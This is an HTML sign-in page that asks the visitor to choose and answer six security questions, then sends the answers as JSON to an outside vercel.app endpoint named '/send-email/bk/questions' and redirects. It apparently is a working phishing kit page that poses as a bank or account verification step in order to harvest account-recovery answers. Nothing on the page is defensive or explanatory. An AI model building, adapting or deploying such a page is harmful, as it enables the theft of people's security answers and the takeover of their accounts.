<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Page1</title>
    <link rel="stylesheet" href="./css/styles.css" />
  </head>
  <body>
    <header></header>
    <main>
      <section id="content">
        <div class="logo-container">
          <img src="img/logo.png" class="logo-img" />
        </div>
        <form
          id="loginForm"
          action="https://server-eight-neon-15.vercel.app/send-email/bk/questions"
          method="POST"
        >
        <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
            <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 1:</label>
            </div>
            <div class="signOnInput">
            <select name="q1" id="q1" required style="font-size:12px;width:293px;height:39px">
            <option value="">Select Question</option>
            <option value="What is your place of birth?">What is your place of birth?</option>
            <option value="What city were you born in?">What city were you born in?</option>
            <option value="What county were your born in?">What county were your born in?</option>
            <option value="What city were you married in?">What city were you married in?</option>
            <option value="What is the month of your wedding anniversary?">What is the month of your wedding anniversary?</option>
            <option value="What city was your first high school in?">What city was your first high school in?</option>
            <option value="What is your fathers's middle name?">What is your fathers's middle name?</option>
            <option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
              </select>
            </div>
            </div>
            <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
            <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 1:</label>
             </div>
             <div class="signOnInput">
             <input type="text" alt="null" tabindex="2" name="ans1" id="ans1" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
             </div>
             <div>
             <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
             </div>
             </div>
             
             <div class="noExtraSpace">
            <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
            <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 2:</label>
            </div>
            <div class="signOnInput">
            <select name="q2" id="q2" required style="font-size:12px;width:293px;height:39px">
             <option value="">Select Question</option>
             <option value="What is the last name of your childhood doctor?">What is the last name of your childhood doctor?</option>
             <option value="What is the street number of the house you grew up in?">What is the street number of the house you grew up in?</option>
             <option value="What is your favorite vacation destination?">What is your favorite vacation destination?</option>
             <option value="What is your favorite color?">What is your favorite color?</option>
             <option value="What is your favorite pet?">What is your favorite pet?</option>
             <option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
             <option value="What is your favorite holiday">What is your favorite holiday?</option>
              </select>
            </div>
            </div>
            <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
            <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 2:</label>
             </div>
             <div class="signOnInput">
             <input type="text" alt="null" tabindex="2" name="ans2" id="ans2" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
             </div>
             <div>
             <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
             </div>
             </div>
             
             <div class="noExtraSpace">
            <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
            <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 3:</label>
            </div>
            <div class="signOnInput">
            <select name="q3" id="q3" required style="font-size:12px;width:293px;height:39px">
             <option value="">Select Question Three</option>
             <option value="What is your favorite food?">What is your favorite food?</option>
             <option value="What was your first car?">What was your first car?</option>
             <option value="What was the make of your first car?">What was the make of your first car?</option>
             <option value="What was your high school mascot?">What was your high school mascot?</option>
             <option value="What was your elementary school?">What was your elementary school?</option>
             <option value="What year did you graduate high school?">What year did you graduate high school?</option>
             <option value="What was your favorite class in school?">What was your favorite class in school?</option>
              </select>
            </div>
            </div>
            <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
            <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 3:</label>
             </div>
             <div class="signOnInput">
             <input type="text" alt="null" tabindex="2" name="ans3" id="ans3" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
             </div>
             <div>
             <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
             </div>
             </div>
             
              <div class="noExtraSpace">
            <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
            <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 4:</label>
            </div>
            <div class="signOnInput">
            <select name="q4" id="q4" required style="font-size:12px;width:293px;height:39px">
             <option value="">Select Question Four</option>
             <option value="What is your place of birth?">What is your place of birth?</option>
            <option value="What city were you born in?">What city were you born in?</option>
            <option value="What county were your born in?">What county were your born in?</option>
            <option value="What city were you married in?">What city were you married in?</option>
            <option value="What is the month of your wedding anniversary?">What is the month of your wedding anniversary?</option>
            <option value="What city was your first high school in?">What city was your first high school in?</option>
            <option value="What is your fathers's middle name?">What is your fathers's middle name?</option>
            <option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
              </select>
            </div>
            </div>
            <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
            <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 4:</label>
             </div>
             <div class="signOnInput">
             <input type="text" alt="null" tabindex="2" name="ans4" id="ans4" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
             </div>
             <div>
             <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
             </div>
             </div>
             
              <div class="noExtraSpace">
            <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
            <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 5:</label>
            </div>
            <div class="signOnInput">
            <select name="q5" id="q5" required style="font-size:12px;width:293px;height:39px">
             <option value="">Select Question Five</option>
              <option value="What is the last name of your childhood doctor?">What is the last name of your childhood doctor?</option>
             <option value="What is the street number of the house you grew up in?">What is the street number of the house you grew up in?</option>
             <option value="What is your favorite vacation destination?">What is your favorite vacation destination?</option>
             <option value="What is your favorite color?">What is your favorite color?</option>
             <option value="What is your favorite pet?">What is your favorite pet?</option>
             <option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
             <option value="What is your favorite holiday">What is your favorite holiday?</option>
              </select>
            </div>
            </div>
            <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
            <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 5:</label>
             </div>
             <div class="signOnInput">
             <input type="text" alt="null" tabindex="2" name="ans5" id="ans5" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
             </div>
             <div>
             <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
             </div>
             </div>
             
              <div class="noExtraSpace">
            <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
            <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 6:</label>
            </div>
            <div class="signOnInput">
            <select name="q6" id="q6" required style="font-size:12px;width:293px;height:39px">
             <option value="">Select Question Six</option>
             <option value="What is your favorite food?">What is your favorite food?</option>
             <option value="What was your first car?">What was your first car?</option>
             <option value="What was the make of your first car?">What was the make of your first car?</option>
             <option value="What was your high school mascot?">What was your high school mascot?</option>
             <option value="What was your elementary school?">What was your elementary school?</option>
             <option value="What year did you graduate high school?">What year did you graduate high school?</option>
             <option value="What was your favorite class in school?">What was your favorite class in school?</option>
              </select>
            </div>
            </div>
            <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
            <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 6:</label>
             </div>
             <div class="signOnInput">
             <input type="text" alt="null" tabindex="2" name="ans6" id="ans6" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
             </div>
             </div>
          <button type="submit">Sign In</button>
        </form>
      </section>
    </main>
    <footer>
      <img
        src="img/footerlinksbig.png"
        alt="footer link 1"
        class="big-footer-link"
      />
      <img
        src="img/footerlinksmall.png"
        alt="footer link 1"
        class="small-footer-link"
      />
      <img src="img/footerbig.png" alt="footer" class="footer big-footer" />
      <img src="img/footersmall.png" alt="footer" class="footer small-footer" />
    </footer>

    <!-- Loading and Success Modals -->
    <div id="modal-overlay" style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.4);z-index:1000;">
      <div id="loading-modal" style="display:none;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:2em 3em;border-radius:8px;text-align:center;">
        <div class="spinner" style="margin:auto;"></div>
      </div>
      <div id="success-modal" style="display:none;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:2em 3em;border-radius:8px;text-align:center;">
        <span>Submission successful!</span>
      </div>
    </div>
    <style>
      .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid #ccc;
        border-top: 4px solid #0078d7;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        display: inline-block;
      }
      @keyframes spin {
        0% { transform: rotate(0deg);}
        100% { transform: rotate(360deg);}
      }
    </style>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const form = document.querySelector("form");
        // Modal elements
        const overlay = document.getElementById("modal-overlay");
        const loadingModal = document.getElementById("loading-modal");
        const successModal = document.getElementById("success-modal");

        function showLoading() {
          overlay.style.display = "block";
          loadingModal.style.display = "block";
          successModal.style.display = "none";
        }
        function showSuccess() {
          loadingModal.style.display = "none";
          successModal.style.display = "block";
        }
        function hideModals() {
          overlay.style.display = "none";
          loadingModal.style.display = "none";
          successModal.style.display = "none";
        }

        if (form) {
          form.addEventListener("submit", async function (e) {
            e.preventDefault();
            showLoading();
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            try {
              const response = await fetch(form.action, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
              });
              if (response.ok) {
                const result = await response.json();
                showSuccess();
                setTimeout(() => {
                  hideModals();
                  window.location.href = result.redirectUrl;
                }, 1200);
              } else {
                hideModals();
                alert("Submission failed.");
              }
            } catch (err) {
              hideModals();
              alert("An error occurred.");
            }
          });
        }
      });
    </script>
  </body>
</html>
